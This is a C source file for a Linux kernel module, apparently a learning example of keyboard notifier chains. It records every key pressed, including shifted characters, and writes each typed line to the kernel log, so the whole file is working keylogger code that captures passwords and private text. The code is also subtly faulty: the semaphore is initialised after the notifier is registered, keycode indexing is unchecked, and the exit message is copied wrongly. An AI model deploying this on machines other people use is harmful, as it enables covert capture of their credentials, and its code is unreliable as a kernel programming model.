//We are going to do some kernel programming
#include <linux/kernel.h>
//Obviously we are creating a module
#include <linux/module.h>
//Just for using macros here
#include <linux/init.h>
//For obtaining PID and process name
#include <linux/sched.h>
//For registering a keyboard notifier
#include <linux/keyboard.h>
//For handling concurrency issues
#include <linux/semaphore.h>


//These are some useful information that could reveald with modinfo command
//Just type in your command line "modinfo ./helloworld.ko" after insmoding it
//Set module license to get rid of tainted kernel warnings
MODULE_LICENSE("GPL");
//Introduce the module's developer, it's functionality and version
MODULE_AUTHOR("Aliireeza Teymoorian <teymoorian@gmail.com>");
MODULE_DESCRIPTION("This is just a simple module based on Linux Kernel notifier chains to monitor keyboard activities and pressed keys");
MODULE_VERSION("1.0.2");


struct semaphore sem;

static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE", "TAB",
	"q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "CTRL", "a", "s", "d", "f",
	"g", "h", "j", "k", "l", ";", "'", "`", "SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
	"/", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
	"F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
	"RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
	"\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
	"UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
	"\0", "\0", "\0", "\0", "\0", "PAUSE"
	};

static const char* shift_keys[] ={ "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "BACKSPACE", "TAB",
	"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A", "S", "D", "F",
	"G", "H", "J", "K", "L", ":", "\"", "~", "SHIFT", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
	"?", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
	"F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
	"RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
	"\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
	"UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
	"\0", "\0", "\0", "\0", "\0", "PAUSE"
	};

static int shift_key_flag = 0;
static char buffer[4096];
static int i = 0, j = 0;
static int error = 0;
	
	

int keyboard_notify( struct notifier_block *nblock, unsigned long code, void *_param ){
	//Know which keys has triggered this callback function
	struct keyboard_notifier_param *param = _param;


	if(code == KBD_KEYCODE){
		if(param->value == 28){
			down(&sem);
			printk(KERN_NOTICE "SIMPLEKEYBOARDNOFIFIER: [%s]\n", buffer);
			for(j=0; j<i; buffer[j++]=NULL);
			i = 0;
			up(&sem);
			return NOTIFY_OK;
		}
		
		if( param->value==42 || param->value==54 ){
			down(&sem);
			if(param->down)
				shift_key_flag = 1;
			else
				shift_key_flag = 0;
			up(&sem);
			return NOTIFY_DONE;
		}

		if(param->down){
			down(&sem);
			if(shift_key_flag == 0 && i<1024)
				strcat(buffer, keys[param->value]);
			else if(shift_key_flag == 1 && i<1024)
				strcat(buffer, shift_keys[param->value]);
			else
				printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Buffer Overflow\n");
			
			i = strlen(buffer);
			up(&sem);
			return NOTIFY_OK;
		}
	}
	return NOTIFY_OK;
}


//Using notifiers for identifying actions on loadable Kernel modules
static struct notifier_block keyboard_nb ={
	.notifier_call = keyboard_notify,  //This fuction will call whenever the notifier triggers
};


//This would be our module start up point
static int __init keyboard_notifier_init(void){
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Init module, Process(%s:%i)\n", current->comm, current->pid);
	//Registering a Notifier
	error = register_keyboard_notifier(&keyboard_nb);
	if(error){
		printk(KERN_ALERT "SIMPLEKEYBOARDNOFIFIER: Error in registering keyboard notifier\n");
		return error;
		}
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Keyboard notifier registered successfully\n");

	sema_init(&sem, 1);
	return error;

}


//Now, due to end this module, its time to clean up the mess
static void __exit keyboard_notifier_exit(void){
	printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Init module, Process(%s:%i)\n", current->comm, current->pid);
	//Unregistering keyboard notifier
	unregister_keyboard_notifier(&keyboard_nb);

        printk(KERN_INFO "SIMPLEKEYBOARDNOFIFIER: Keyboard notifier deregistered\n");
}


//Definition of init_module and cleanup_modules with user-defined functions
module_init(keyboard_notifier_init);
module_exit(keyboard_notifier_exit);
